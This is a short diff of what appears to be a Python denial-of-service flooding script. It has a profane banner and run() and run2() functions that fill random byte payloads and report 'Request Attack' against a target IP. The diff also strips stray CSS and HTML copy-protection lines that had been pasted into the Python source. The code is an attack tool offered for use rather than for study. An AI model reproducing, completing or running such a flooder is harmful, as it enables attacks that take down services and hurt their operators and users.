@@ -23,15 +23,6 @@ class bcolors:
     UNDERLINE = '\033[4m'
     ZH = '\033[97m'
 
-anti-copas {
-	-webkit-touch-callout: none; /* iOS Safari */
-	-webkit-user-select: none; /* Safari */
-	-khtml-user-select: none; /* Konqueror HTML */
-	-moz-user-select: none; /* Old versions of Firefox */
-	-ms-user-select: none; /* Internet Explorer/Edge */
-	user-select: none; /* Non-prefixed version, currently supported by Chrome, Opera and Firefox */
-}
-
 
 attemps = 0
 os.system("clear")
@@ -82,7 +73,6 @@ time.sleep(5),
 print("\033[95m               ⟩⟩  FUCK U MURDER \033[0m "),
 time.sleep(5),
 
-<div Class="anti-copas">
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]"))
@@ -95,7 +85,6 @@ def run():
 			print("\033[95m[\033[97m+\033[95m] \033[91mRequest Attack  :. " +ip+ " \033[0m")
 		except:
 			print("\033[33m[\033[95m!\033[33m] Error!")
-</div>
 
 def run2():
 	data = random._urandom(999)
